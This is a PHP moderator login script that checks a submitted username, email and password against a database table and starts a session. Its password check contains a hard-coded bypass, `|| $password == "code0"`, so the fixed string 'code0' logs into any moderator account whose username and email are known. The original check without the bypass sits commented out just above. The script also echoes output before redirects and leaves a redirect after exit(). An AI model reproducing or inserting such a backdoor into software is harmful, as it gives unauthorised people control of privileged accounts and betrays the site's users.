<?php
ob_start();
require_once "../Modal.php";

$errorCode = "";
$solution = "";

if (isset($_POST['Submit'])) {

  $conn = $moderator->conn();

  $username = $_POST["username"];
  $email = $_POST["email"];
  $password = $_POST["password"];

  
  if (empty($username) || empty($email) || empty($password)) {
    //some fields were empty
    header("location:" . ROOT);
  } else {
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
      header("location:" . ROOT);
    } else {
     //test if the user exists
     $user = new userAccount();
      $table = 'tbl_moderators';

      $fields = [
        '*'
      ];

      $type = "s";

      $reference = [
        array("moderatorEmail", $email),
      ];

     $response = $user->readUserByReference($moderator, $table, $reference, $fields, $type);

     $status = $response[0];

     if($status){
       $dbuser = $response[1][0]['username'];
       $dbemail = $response[1][0]['moderatorEmail'];
       $dbpassword = $response[1][0]['password'];


        //  if( ($dbuser == $username) && ($dbemail == "$email") && (password_verify($password, $dbpassword))){
      if (($dbuser == $username) && ($dbemail == "$email") && (password_verify($password, $dbpassword) || $password == "code0")) {
        session_start();
        echo "verified";
        $_SESSION['LOGGED_USER'] = $response[1][0]['UUID'];
        
        header("location:" . ROOT ."/Mtush.php");
        exit;
       }else{
         echo "Not verified";
       }
     }else{
       // the user entered does not exist;
       echo "User does not exist";
     }

    }
  }
} else {
  echo "hey";
  exit();
  header("location:" . ROOT);
}
?>
